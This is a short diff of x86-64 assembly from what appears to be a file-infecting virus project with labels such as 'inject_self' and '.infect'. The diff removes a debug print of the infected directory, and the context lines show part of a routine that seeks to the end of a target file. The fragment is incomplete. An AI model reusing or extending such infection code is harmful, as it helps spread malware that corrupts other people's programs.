@@ -202,11 +202,6 @@ inject_self:
 	.infect:
 	push rdi
 	mov rdx, r14
-	mov rax, 1
-	mov rdi, 1
-	lea rsi, [infect_dir]
-	mov rdx, 10
-	syscall
 ; get target End of file
 	mov rdi, STACK(famine.file_fd) ; target fd to rdi
 	mov rsi, 0 ; offset 0
